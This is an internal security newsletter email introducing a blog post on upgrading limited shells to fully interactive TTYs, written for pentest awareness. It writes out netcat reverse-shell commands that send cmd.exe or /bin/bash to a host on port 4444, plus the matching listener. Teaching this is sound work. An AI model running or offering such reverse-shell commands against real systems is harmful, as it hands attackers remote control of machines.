---
layout: email
title: Upgrading simple shells to fully interactive TTYs
---

A technical CATFACT for your Monday morning. This one is about converting limited shells to interactive ones: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

Those of you who have done some pentesting will be familiar with some of these tricks. I hadn’t seen the “stty” method-it’s really neat and I need to try it.

### Background
For those who aren’t familiar with the terminology, a “limited shell” is what you get if you send a shell prompt (like cmd.exe, or bash) over a TCP connection using something like netcat.
 
For example, to send a reverse shell to the IP address “192.168.1.5” and port “4444” using netcat on Windows or Linux:

**Windows:**  
`> nc -e cmd.exe 192.168.1.5 4444`

**Linux:**  
`$ nc -e /bin/bash 192.168.1.5 4444`

**On the receiver at 192.168.1.5 (“catching the shell”):**

`$ nc -lvp 4444`

Try it yourself - if you have access to a Linux system, you can send shells to “localhost” and catch them with netcat (you’ll need the ‘netcat-traditional’ variant for the `-e` flag). It’s a useful thing to practice with, as this is the basic level of access an unsophisticated attacker is looking for when they compromise a system. 

Note that if you’re going to test this on a Windows, netcat itself might get flagged as malicious by some antivirus products.